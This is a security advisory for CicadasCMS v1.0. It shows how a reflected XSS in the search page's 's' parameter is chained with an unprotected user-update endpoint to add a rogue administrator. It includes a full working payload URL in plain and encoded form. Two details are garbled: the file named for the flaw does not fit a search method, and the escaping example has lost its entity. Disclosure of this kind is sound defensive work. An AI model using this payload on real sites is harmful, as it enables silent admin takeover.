## Vulnerability Description

The user management module in CicadasCMS v1.0 has a logical flaw. Its critical interface `/system/user/update` (used to add or update administrator users) lacks **CSRF (Cross-Site Request Forgery)** protection and does not incorporate **Anti-CSRF Tokens** for request legitimacy verification.

Although this interface uses a `POST` request and sends requests in JSON format, inherently protecting against CSRF vulnerabilities, the `/search` interface under the same domain has a reflected XSS (Cross-Site Scripting) vulnerability in the parameter `s`. Attackers can construct a malicious exploit chain and use XSS scripts to bypass the Same-Origin Policy (SOP) in the browser context of a victim (a logged-in administrator), automatically triggering this sensitive interface. A remote attacker can induce the administrator to visit a specific malicious link, silently creating a new administrator account with full system privileges without the administrator's knowledge, thereby achieving complete takeover of the CicadasCMS system.

## Vulnerability Analysis

### Reflected XSS vulnerability


Vulnerable class file: org/springframework/cache/support/AbstractCacheManager.java

Line 413 specifies that the 's' parameter is an integer. If a character value is entered, an error message will be displayed, returning the input as an error. Furthermore, the entire `search` method does not perform any XSS filtering on the 's' parameter.

<img width="1345" height="693" alt="Pasted image 20260504165435" src="https://github.com/user-attachments/assets/edcd0f0f-d1fe-4ad2-8387-1578d6677ce4" />



Inputting s=1' will return the following response, completely reflecting the input.

<img width="1920" height="788" alt="Pasted image 20260504165641" src="https://github.com/user-attachments/assets/036efd63-50d6-49de-9893-59cc219786bf" />


### Lack of **CSRF (Cross-Site Request Forgery) protection mechanisms**

The vulnerability's entry point class file is: src/main/java/com/zhiliao/module/web/system/UserController.java

The update method has no CSRF protection mechanism.
<img width="1325" height="361" alt="Pasted image 20260504165918" src="https://github.com/user-attachments/assets/c46ce91f-b6c1-4271-b9cc-27c9756c8ff1" />


Logic layer class file: src/main/java/com/zhiliao/module/web/system/service/impl/SysUserServiceImpl.java

The `save` method doesn't have any CSRF protection methods; it jumps directly to line 134 and calls the database insert operation to save the administrator user. This sensitive operation of adding an administrator user has a logical flaw.

<img width="1415" height="840" alt="Pasted image 20260504170046" src="https://github.com/user-attachments/assets/8116ee9d-d687-4ffe-8f59-37376c1f5631" />


## Vulnerability Reproduction

First, log in to the admin user account. In the user management module, under the system user interface, you can see that there is currently no csrf_admin administrator user.

<img width="1920" height="594" alt="Pasted image 20260504170532" src="https://github.com/user-attachments/assets/37d93f82-6d6a-4cd6-9dd8-498e719fd563" />


Construct the following XSS attack payload link:
http://127.0.0.1:12345/search?s="><script>$.post('/system/user/update',{userId:'',username:'csrf_admin',avatar:'/res/c762648618f34a708ee4aca6f325544a.jpg',password:'123456',status:'1',roleId:'1',des:'csrf_test',orgId:'3,11'});</script><"&keyword=aaa

Then the 's' parameter is URL encoded:

http://127.0.0.1:12345/search?s=%22%3e%3c%73%63%72%69%70%74%3e%24%2e%70%6f%73%74%28%27%2f%73%79%73%74%65%6d%2f%75%73%65%72%2f%75%70%64%61%74%65%27%2c%7b%75%73%65%72%49%64%3a%27%27%2c%75%73%65%72%6e%61%6d%65%3a%27%63%73%72%66%5f%61%64%6d%69%6e%27%2c%61%76%61%74%61%72%3a%27%2f%72%65%73%2f%63%37%36%32%36%34%38%36%31%38%66%33%34%61%37%30%38%65%65%34%61%63%61%36%66%33%32%35%35%34%34%61%2e%6a%70%67%27%2c%70%61%73%73%77%6f%72%64%3a%27%31%32%33%34%35%36%27%2c%73%74%61%74%75%73%3a%27%31%27%2c%72%6f%6c%65%49%64%3a%27%31%27%2c%64%65%73%3a%27%63%73%72%66%5f%74%65%73%74%27%2c%6f%72%67%49%64%3a%27%33%2c%31%31%27%7d%29%3b%3c%2f%73%63%72%69%70%74%3e%3c%22&keyword=aaa

In the browser logged in as the admin user, open a new webpage and then visit the URL-encoded link above. This simulates an attacker using XSS-guided CSRF to add a csrf_admin user attack.

<img width="1920" height="705" alt="Pasted image 20260504170856" src="https://github.com/user-attachments/assets/a30a7637-9af3-4556-9a34-4c494d1b3eda" />


The response is as follows:
<img width="1920" height="953" alt="Pasted image 20260504171009" src="https://github.com/user-attachments/assets/57304a2b-739f-4f45-a77e-e097515ee434" />


Returning to the admin account, in the user management module, under the system user interface, refresh, and you will see that a new user, csrf_admin, has been added. The vulnerability has been successfully reproduced.

<img width="1920" height="827" alt="Pasted image 20260504171113" src="https://github.com/user-attachments/assets/a107656e-b719-4a4b-8948-3db00a2ae7f6" />



## Repair suggestions

- **Resolve XSS Contingency:**

- Perform strict type validation on all user input, ensuring that the `s` parameter only accepts numbers.

- When displaying error messages or exception stack traces, HTML entity encoding is mandatory (e.g., escape `<` as `<`).

- Configure a **Content Security Policy (CSP)** to restrict unauthorized script execution.

- **Resolve CSRF Contingency:**

- Introduce an **Anti-CSRF Token** mechanism for all sensitive operation interfaces (such as CRUD operations).

- Use the `SameSite=Strict` or `Lax` attribute to set cookies to prevent third-party sites from carrying cookies.

- **Enhanced Access Control:**

- Add two-factor authentication to management interfaces (e.g., re-entering the password before each operation).

- Set a critical cookie to `HttpOnly` to prevent XSS scripts from stealing session tokens.
